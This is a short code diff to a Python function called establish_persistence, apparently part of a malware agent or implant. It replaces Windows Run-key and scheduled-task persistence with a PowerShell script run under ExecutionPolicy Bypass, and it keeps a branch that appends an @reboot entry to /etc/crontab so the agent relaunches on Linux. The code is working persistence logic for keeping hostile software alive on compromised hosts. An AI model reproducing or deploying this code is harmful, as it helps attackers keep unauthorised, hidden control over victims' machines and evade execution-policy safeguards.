@@ -12,13 +12,8 @@ import os
 
 def establish_persistence():
     if os.name == 'nt':
-        command = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /t REG_SZ /d "C:\path\to\your\agent.exe" /f'
-        os.system(command)
-
-        task_name = "MyPersistentTask"
-        command = f'schtasks /create /tn {task_name} /tr "C:\path\to\your\agent.exe" /sc onlogon'
-        os.system(command)
-        
+        script_path = os.path.join(os.path.dirname(__file__), 'windows', 'persistence.ps1')
+        os.system(f"powershell -ExecutionPolicy Bypass -File {script_path}")
     elif os.name == 'posix':
         cron_job = "@reboot /path/to/your/agent.sh"
         with open("/etc/crontab", "a") as cron_file:
